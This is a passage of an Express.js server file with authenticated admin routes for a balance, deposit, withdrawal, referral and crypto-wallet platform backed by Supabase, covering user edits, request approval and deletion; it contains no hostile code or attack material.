app.get("/admin/referrals", adminLimiter, adminAuth, async (req, res) => {
  const { data } = await supabase
    .from("users")
    .select("id,fullname,nickname,email,balance,referrer_id")
    .order("id", { ascending: true });
  return res.json((data || []).map(withDisplayId));
});

app.post("/admin/add-balance", adminLimiter, adminAuth, async (req, res) => {
  const user = await findUser(Number(req.body.user_id), "id,balance");
  const amount = Number(req.body.amount);
  if (!user || !Number.isFinite(amount) || Math.abs(amount) > 1000000) return res.json({ success: false });
  const balance = Number(user.balance || 0) + amount;
  await supabase.from("users").update({ balance }).eq("id", user.id);
  return res.json({ success: true, balance });
});

app.post("/admin/set-balance", adminLimiter, adminAuth, async (req, res) => {
  const userId = Number(req.body.user_id);
  const amount = Number(req.body.amount);
  if (!Number.isInteger(userId) || userId <= 0 || !Number.isFinite(amount) || amount < 0 || amount > 1000000) return res.json({ success: false });
  await supabase.from("users").update({ balance: amount }).eq("id", userId);
  return res.json({ success: true, balance: amount });
});

app.post("/admin/update-user", adminLimiter, adminAuth, async (req, res) => {
  try {
    const userId = Number(req.body.user_id);
    const current = await findUser(userId, "id,email,referrer_id,wallet_address");
    if (!current) return res.json({ success: false, message: "User not found" });

    const fullname = cleanText(req.body.fullname, 80);
    const nickname = cleanText(req.body.nickname, 40);
    const country = cleanText(req.body.country, 60);
    const phone = cleanPhone(req.body.phone);
    const email = cleanEmail(req.body.email);
    const wallet = cleanWallet(req.body.wallet_address);
    const balance = Number(req.body.balance);
    const deposit = Number(req.body.deposit);
    const referrerText = String(req.body.referrer_id || "").trim();
    const referrerId = parseUserId(referrerText);

    if (!fullname || !nickname || !country || phone.length < 10 || phone.length > 15) {
      return res.json({ success: false, message: "Invalid profile data" });
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.json({ success: false, message: "Invalid email" });
    }
    if (wallet && !isValidWallet(wallet)) {
      return res.json({ success: false, message: "Invalid wallet" });
    }
    if (!Number.isFinite(balance) || balance < 0 || balance > 1000000 || !Number.isFinite(deposit) || deposit < 0 || deposit > 1000000) {
      return res.json({ success: false, message: "Invalid balance or deposit" });
    }
    if (referrerText && !referrerId) {
      return res.json({ success: false, message: "Invalid referrer ID" });
    }
    if (referrerId === userId) {
      return res.json({ success: false, message: "Referrer cannot be the same user" });
    }
    if (referrerId) {
      const referrer = await findUser(referrerId, "id");
      if (!referrer) return res.json({ success: false, message: "Referrer not found" });
    }
    if (email !== current.email) {
      const { data: existing, error: existingError } = await supabase
        .from("users")
        .select("id")
        .eq("email", email)
        .neq("id", userId)
        .maybeSingle();
      if (existingError) throw existingError;
      if (existing) return res.json({ success: false, message: "Email already exists" });
    }

    const updates = {
      fullname,
      nickname,
      country,
      phone,
      email,
      wallet_address: wallet || null,
      balance: Number(balance.toFixed(2)),
      deposit: Number(deposit.toFixed(2)),
      referrer_id: referrerId || null
    };
    const { error } = await supabase.from("users").update(updates).eq("id", userId);
    if (error) throw error;
    await refreshSatelliteCount(current.referrer_id);
    await refreshSatelliteCount(referrerId);
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN UPDATE USER ERROR:", error);
    return res.status(500).json({ success: false, message: "User update error" });
  }
});

app.post("/admin/set-wallet", adminLimiter, adminAuth, async (req, res) => {
  try {
    const signalId = Number(req.body.id);
    const wallet = cleanWallet(req.body.wallet);
    if (!Number.isInteger(signalId) || signalId <= 0 || !isValidWallet(wallet)) {
      return res.json({ success: false, message: "Invalid wallet" });
    }
    const { data: signal, error: signalError } = await supabase
      .from("signals")
      .select("id,user_id,type,wallet,status")
      .eq("id", signalId)
      .maybeSingle();
    if (signalError) throw signalError;
    if (!signal || !isWalletCreateSignal(signal) || signal.status !== "pending") {
      return res.json({ success: false, message: "Request unavailable" });
    }
    const user = await findUser(signal.user_id, "id,email");
    const { error: userError } = await supabase
      .from("users")
      .update({ wallet_address: wallet })
      .eq("id", signal.user_id);
    if (userError) throw userError;
    const signalWallet = signal.type === WALLET_CREATE_FALLBACK_TYPE ? walletCreatePayload(wallet) : wallet;
    const { error: updateError } = await supabase
      .from("signals")
      .update({ wallet: signalWallet, status: "approved" })
      .eq("id", signal.id);
    if (updateError) throw updateError;
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN SET WALLET ERROR:", error);
    return res.status(500).json({ success: false, message: "Wallet update error" });
  }
});

app.post("/admin/manual-wallet", adminLimiter, adminAuth, async (req, res) => {
  try {
    const userId = Number(req.body.user_id);
    const wallet = cleanWallet(req.body.wallet);
    if (!Number.isInteger(userId) || userId <= 0 || !isValidWallet(wallet)) {
      return res.json({ success: false, message: "Invalid wallet" });
    }
    const user = await findUser(userId, "id,email");
    if (!user) return res.json({ success: false, message: "User not found" });

    const { error: userError } = await supabase
      .from("users")
      .update({ wallet_address: wallet })
      .eq("id", user.id);
    if (userError) throw userError;

    const { error: signalError } = await supabase
      .from("signals")
      .update({ wallet, status: "approved" })
      .eq("user_id", user.id)
      .eq("type", WALLET_CREATE_SIGNAL_TYPE)
      .eq("status", "pending");
    if (signalError) throw signalError;
    const { data: fallbackSignals, error: fallbackReadError } = await supabase
      .from("signals")
      .select("id,wallet")
      .eq("user_id", user.id)
      .eq("type", WALLET_CREATE_FALLBACK_TYPE)
      .eq("status", "pending")
      .limit(10);
    if (fallbackReadError) throw fallbackReadError;
    const fallbackIds = (fallbackSignals || []).filter(isWalletCreateSignal).map(signal => signal.id);
    if (fallbackIds.length) {
      const { error: fallbackUpdateError } = await supabase
        .from("signals")
        .update({ wallet: walletCreatePayload(wallet), status: "approved" })
        .in("id", fallbackIds);
      if (fallbackUpdateError) throw fallbackUpdateError;
    }

    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN MANUAL WALLET ERROR:", error);
    return res.status(500).json({ success: false, message: "Wallet update error" });
  }
});

app.post("/admin/approve", adminLimiter, adminAuth, async (req, res) => {
  try {
    const signalId = Number(req.body.id);
    const { data: signal } = await supabase.from("signals").select("id,user_id,type,amount,wallet,status").eq("id", signalId).maybeSingle();
    if (!signal || signal.status !== "pending") return res.json({ success: false, message: "Request unavailable" });
    if (signal.type === "deposit" || signal.type === "withdraw") {
      const amount = positiveAmount(signal.amount);
      const withdrawDebitAmount = signal.type === "withdraw" ? withdrawalGrossAmount(signal) : amount;
      const user = await findUser(signal.user_id, "id,balance,deposit");
      if (!user || !amount || !withdrawDebitAmount) return res.json({ success: false, message: "Invalid request" });
      if (signal.type === "withdraw" && withdrawDebitAmount < MIN_WITHDRAW_AMOUNT) {
        return res.json({ success: false, message: `Minimum withdrawal is $${MIN_WITHDRAW_AMOUNT}` });
      }
      const earnedAvailable = Number((Number(user.balance || 0) - Number(user.deposit || 0)).toFixed(2));
      if (signal.type === "withdraw" && (Number(user.balance || 0) < withdrawDebitAmount || withdrawDebitAmount > earnedAvailable)) {
        return res.json({ success: false, message: "Only earned funds are available for withdrawal" });
      }
      const balance = signal.type === "deposit"
        ? Number((Number(user.balance || 0) + amount).toFixed(2))
        : Number((Number(user.balance || 0) - withdrawDebitAmount).toFixed(2));
      const updates = { balance };
      if (signal.type === "deposit") updates.deposit = Number((Number(user.deposit || 0) + amount).toFixed(2));
      const { error } = await supabase.from("users").update(updates).eq("id", signal.user_id);
      if (error) throw error;
    } else if (isWalletCreateSignal(signal)) {
      return res.json({ success: false, message: "Wallet address is required" });
    } else if (signal.type === "profile_update" || signal.type === "email_update") {
      const changes = safeJsonObject(signal.wallet);
      const allowed = signal.type === "email_update"
        ? { email: cleanEmail(changes.email), email_verified: true }
        : {
            fullname: cleanText(changes.fullname, 80),
            nickname: cleanText(changes.nickname, 40),
            country: cleanText(changes.country, 60),
            phone: cleanPhone(changes.phone)
          };
      if (signal.type === "email_update" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(allowed.email)) {
        return res.json({ success: false, message: "Invalid email" });
      }
      if (signal.type === "profile_update" && (!allowed.fullname || !allowed.nickname || !allowed.country || allowed.phone.length < 10 || allowed.phone.length > 15)) {
        return res.json({ success: false, message: "Invalid profile data" });
      }
      const { error } = await supabase.from("users").update(allowed).eq("id", signal.user_id);
      if (error) throw error;
    }
    await supabase.from("signals").update({ status: "approved" }).eq("id", signalId);
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN APPROVE ERROR:", error);
    return res.status(500).json({ success: false, message: "Approval error" });
  }
});

app.post("/admin/reject", adminLimiter, adminAuth, async (req, res) => {
  const signalId = Number(req.body.id);
  if (!Number.isInteger(signalId) || signalId <= 0) return res.json({ success: false });
  const { data: signal } = await supabase
    .from("signals")
    .select("id,user_id,type,wallet,status")
    .eq("id", signalId)
    .maybeSingle();
  if (isWalletCreateSignal(signal)) {
    const user = await findUser(signal.user_id, "id,wallet_address");
    const wallet = cleanWallet(walletCreatePayloadWallet(signal.wallet) || signal.wallet);
    const currentWallet = personalWalletAddress(user);
    if (wallet && currentWallet === wallet) {
      await supabase.from("users").update({ wallet_address: null }).eq("id", signal.user_id);
    }
  }
  await supabase.from("signals").update({ status: "rejected" }).eq("id", signalId);
  return res.json({ success: true });
});

app.post("/admin/delete-signal", adminLimiter, adminAuth, async (req, res) => {
  try {
    const signalId = Number(req.body.id);
    if (!Number.isInteger(signalId) || signalId <= 0) return res.json({ success: false, message: "Invalid signal" });
    const { error } = await supabase.from("signals").delete().eq("id", signalId);
    if (error) throw error;
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN DELETE SIGNAL ERROR:", error);
    return res.status(500).json({ success: false, message: "Delete error" });
  }
});

app.post("/admin/delete-user", adminLimiter, adminAuth, async (req, res) => {
  try {
    const userId = Number(req.body.user_id);
    if (!Number.isInteger(userId) || userId <= 0) return res.json({ success: false, message: "Invalid user" });
    const user = await findUser(userId, "id,referrer_id");
    if (!user) return res.json({ success: false, message: "User not found" });
    const { error: referralsError } = await supabase.from("users").update({ referrer_id: null }).eq("referrer_id", userId);
    if (referralsError) throw referralsError;
    const { error: signalsError } = await supabase.from("signals").delete().eq("user_id", userId);
    if (signalsError) throw signalsError;
    const { error: usersError } = await supabase.from("users").delete().eq("id", userId);
    if (usersError) throw usersError;
    await refreshSatelliteCount(user.referrer_id);
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN DELETE USER ERROR:", error);
    return res.status(500).json({ success: false, message: "Delete error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
